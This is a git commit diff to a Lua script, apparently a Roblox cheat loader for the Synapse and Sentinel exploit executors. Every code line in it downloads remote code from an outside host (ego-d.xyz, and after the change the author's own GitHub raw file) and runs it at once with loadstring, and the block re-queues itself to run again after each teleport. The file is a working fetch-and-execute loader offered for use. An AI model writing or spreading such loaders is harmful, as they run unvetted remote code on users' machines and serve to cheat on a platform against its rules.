a3f9bbfcf05064c64da3f047bc2ca47fb5479c65
chimnguu <57534799+chimnguu@users.noreply.github.com>
2021-06-10 15:36:57 +0700

    Update zua_buoi.lua

--- zua_buoi.lua
+++ zua_buoi.lua
@@ -1,7 +1,7 @@
 local buoi = [[
 local Exploit = secure_load and "Sentinel" or syn and "Synapse"
 loadstring(game:HttpGet("https://ego-d.xyz/Script?Exploit="..Exploit))()
-loadstring(game:HttpGet("https://ego-d.xyz/Script?Exploit="..Exploit))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/chimnguu/ngu/master/zua_buoi.lua'))()
 ]]
 
 syn.queue_on_teleport(buoi)
